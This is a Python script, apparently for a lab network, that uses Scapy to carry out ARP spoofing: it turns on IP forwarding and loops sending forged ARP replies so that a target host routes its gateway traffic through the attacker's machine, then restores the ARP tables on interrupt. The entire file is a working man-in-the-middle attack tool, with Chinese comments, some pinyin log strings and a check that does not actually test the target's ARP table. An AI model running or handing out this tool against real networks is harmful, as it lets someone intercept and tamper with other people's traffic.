from scapy.all import *
import os
import time

def enable_ip_forwarding():
    """启用 IP 转发"""
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
        f.write('1')

def disable_ip_forwarding():
    """禁用 IP 转发"""
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
        f.write('0')

def send_arp_poison(target_ip, target_mac, gateway_ip, attacker_mac, iface):
    """发送伪造的 ARP 包"""
    # 伪造网关到目标设备的 ARP 包
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=attacker_mac)
    send(packet, iface=iface, verbose=False)
    print(f"[INFO] ARP: {gateway_ip} ({attacker_mac}) -> {target_ip} ({target_mac})")

def restore_arp(target_ip, target_mac, gateway_ip, gateway_mac):
    """恢复 ARP 表"""
    print("[INFO] FFFAR...")
    send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), count=3)
    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), count=3)
    print("[INFO] ARP")

def get_mac(ip):
    """获取目标设备的 MAC 地址"""
    ans, _ = srp(ARP(pdst=ip), timeout=2, verbose=False)
    for _, received in ans:
        return received.hwsrc
    return None

def main():
    # 配置相关信息
    target_ip = "192.168.88.131"  # 替换为目标设备 IP
    gateway_ip = "192.168.88.2"   # 替换为网关 IP
    iface = "ens33"            # 替换为攻击设备的网卡名称

    # 获取 MAC 地址
    attacker_mac = get_if_hwaddr(iface)  # 本机 MAC 地址
    target_mac = getmacbyip(target_ip)  # 目标设备原始 MAC 地址
    gateway_mac = getmacbyip(gateway_ip)  # 网关 MAC 地址

    if target_mac is None or gateway_mac is None:
        print("[ERROR] MAC")
        return

    print(f"[INFO] 1: {target_ip} ({target_mac})")
    print(f"[INFO] 2: {gateway_ip} ({gateway_mac})")
    print(f"[INFO] 3: {attacker_mac}")

    try:
        # 启用 IP 转发
        enable_ip_forwarding()

        print("[INFO] kaishi ARP ...")

        while True:
            # 持续发送伪造的 ARP 包
            send_arp_poison(target_ip, target_mac, gateway_ip, attacker_mac, iface)
            
            # 检查目标设备的 ARP 表是否已经修改
            observed_mac = get_mac(target_ip)
            if observed_mac != gateway_mac:
                print(f"[INFO]  ARP xuigaicheng: {observed_mac}")
            else:
                print(f"[INFO]  ARP shibai: {observed_mac}")

            time.sleep(2)  # 每隔 2 秒发送一次

    except KeyboardInterrupt:
        print("\n[INFO] error...")
        restore_arp(target_ip, target_mac, gateway_ip, gateway_mac)

    finally:
        # 禁用 IP 转发
        disable_ip_forwarding()

if __name__ == "__main__":
    main()
